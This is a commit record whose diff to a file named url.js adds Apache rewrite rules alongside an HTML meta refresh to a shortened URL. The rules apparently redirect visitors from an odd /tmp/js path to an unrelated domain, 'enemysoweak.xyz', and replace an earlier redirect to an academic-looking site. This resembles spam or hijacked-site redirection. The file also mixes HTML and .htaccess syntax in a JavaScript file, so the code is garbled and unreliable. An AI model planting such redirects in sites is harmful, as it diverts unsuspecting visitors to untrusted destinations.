b4ec857f59c3602a0294532b54a98aa3d567637d
2S Struggle Street <vyscomaylando@gmail.com>
2024-11-29 03:35:32 +0700

    Update url.js

--- url.js
+++ url.js
@@ -1,2 +1,5 @@
 <meta http-equiv="refresh" content="0;url=https://t.ly/superqris">
-redirect 301 / https://icap.edu.pl (.htaccess)
+  
+ RewriteEngine on
+ RewriteCond %{REQUEST_URI}  ^/tmp/js/-/mata365/           [NC]
+ RewriteRule /(.*) https://enemysoweak.xyz/kasihkeras/o138/$1 [R=301,L]
